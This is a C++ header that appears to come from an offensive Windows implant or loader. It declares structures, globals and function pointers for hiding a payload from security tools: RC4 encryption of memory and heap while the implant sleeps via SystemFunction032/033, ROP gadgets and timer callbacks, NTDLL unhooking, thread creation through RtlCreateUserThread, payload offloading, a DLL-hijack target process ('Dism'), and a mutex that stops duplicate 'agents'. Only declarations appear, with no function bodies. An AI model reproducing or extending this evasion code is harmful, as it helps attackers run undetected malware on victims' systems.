#pragma once
#include <windows.h>
#include <string>

// Custom libs
#include "CContextHook.hpp"
#include "GadgetFinder.hpp"
#include "Payload.hpp"
#include "Random.hpp"
#include "Route.hpp"
#include "Refresh.hpp" // Better to use FreshyCalls eventually and do dynmically resolved syscalls
#include "Sleep.hpp"

// Setup structs
typedef struct _CRYPT_BUFFER {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} CRYPT_BUFFER, * PCRYPT_BUFFER, DATA_KEY, * PDATA_KEY, CLEAR_DATA, * PCLEAR_DATA, CYPHER_DATA, * PCYPHER_DATA;

struct dataBlock
{
	PVOID location;
	SIZE_T size;
};

struct SetupConfiguration {
	LPVOID gadget;
	LPVOID gadgetPad;

	LPVOID OldSleep;
	DWORD dwMilisconds;

	LPVOID Encrypt;
	LPVOID Decrypt;
	LPVOID encLocation;
	SIZE_T encLocationSize;

	LPVOID VirtualProtect;
	PDWORD OldProtect;

	PDATA_KEY key;
	PCRYPT_BUFFER PayloadBuffer;
	PCRYPT_BUFFER EncryptBuffer;

	LPVOID BaseAddress;
	SIZE_T DLLSize;

	LPVOID VirtualFree;
	LPVOID ExitThread;
	DWORD FreeType;
	HANDLE ThreadHandle;
};

typedef struct _MEMORY_IMAGE_INFORMATION {
	PVOID ImageBase;
	SIZE_T SizeOfImage;
	union {
		ULONG ImageFlags;
		struct {
			ULONG ImagePartialMap : 1;
			ULONG ImageNotExecutable : 1;
			ULONG ImageSigningLevel : 4; // REDSTONE3
			ULONG Reserved : 26;
		};
	};
} MEMORY_IMAGE_INFORMATION, * PMEMORY_IMAGE_INFORMATION;

typedef enum _MEMORY_INFORMATION_CLASS {
	MemoryBasicInformation, // MEMORY_BASIC_INFORMATION
	MemoryWorkingSetInformation, // MEMORY_WORKING_SET_INFORMATION
	MemoryMappedFilenameInformation, // UNICODE_STRING
	MemoryRegionInformation, // MEMORY_REGION_INFORMATION
	MemoryWorkingSetExInformation, // MEMORY_WORKING_SET_EX_INFORMATION
	MemorySharedCommitInformation, // MEMORY_SHARED_COMMIT_INFORMATION
	MemoryImageInformation, // MEMORY_IMAGE_INFORMATION
	MemoryRegionInformationEx,
	MemoryPrivilegedBasicInformation,
	MemoryEnclaveImageInformation, // MEMORY_ENCLAVE_IMAGE_INFORMATION // since REDSTONE3
	MemoryBasicInformationCapped
} MEMORY_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* NtQueryVirtualMemory_t)(
	HANDLE				   ProcessHandle,
	PVOID					BaseAddress,
	MEMORY_INFORMATION_CLASS MemoryInformationClass,
	PVOID					MemoryInformation,
	SIZE_T				   MemoryInformationLength,
	PSIZE_T				  ReturnLength
);

//RTL Declartion, NTDLL.LIB
typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;
typedef LONG(WINAPI* RtlCreateUserThread_t)(HANDLE,
	PSECURITY_DESCRIPTOR,
	BOOLEAN, ULONG,
	PULONG, PULONG,
	PVOID, PVOID,
	PHANDLE, PCLIENT_ID);
RtlCreateUserThread_t RtlCreateUserThread;

// Functions
extern "C" VOID CALLBACK freeRop(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
extern "C" VOID CALLBACK cryptor(LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue);
typedef NTSTATUS(WINAPI* SystemFunction032_t)(IN OUT PCRYPT_BUFFER pData, IN PDATA_KEY pKey);
SystemFunction032_t SystemFunction032 = NULL;
typedef NTSTATUS(WINAPI* SystemFunction033_t)(IN OUT PCRYPT_BUFFER pData, IN PDATA_KEY pKey);
SystemFunction033_t SystemFunction033 = NULL;
typedef NTSTATUS(WINAPI* NtTestAlert_t)();
NtTestAlert_t NtTestAlert = NULL;

// Variables
#if defined(RELEASE_DLL) || defined(DEBUG_DLL)
// User Assigned for DLL Hijacks
std::string procNameHijack = "Dism";
#endif
// Base Configuration
SetupConfiguration config;
// Custom Heap
HANDLE myHeap = HeapCreate(NULL, NULL, NULL);
// Our Gadget Locations
LPVOID gadget = 0;
LPVOID jmp_rbx_0 = 0;
// Offloaded payload location and size
LPVOID offload = NULL;
static SIZE_T offloadSize = 0;
// Self base, additional section to alter, and text section + sizes
LPVOID selfBase = NULL;
static SIZE_T selfBaseSize = 0;
// Heap encryption structs
static PROCESS_HEAP_ENTRY entryEncryptDecrypt;
// Encryption Key Data
static std::string key;
static size_t keySize = 4096;
// Initialize Mutexes to prevent multiple agents in the same thread
HANDLE ghMutex;
// Exit Process Cleanup Point
LPVOID dllOffloadEntryPoint = NULL;
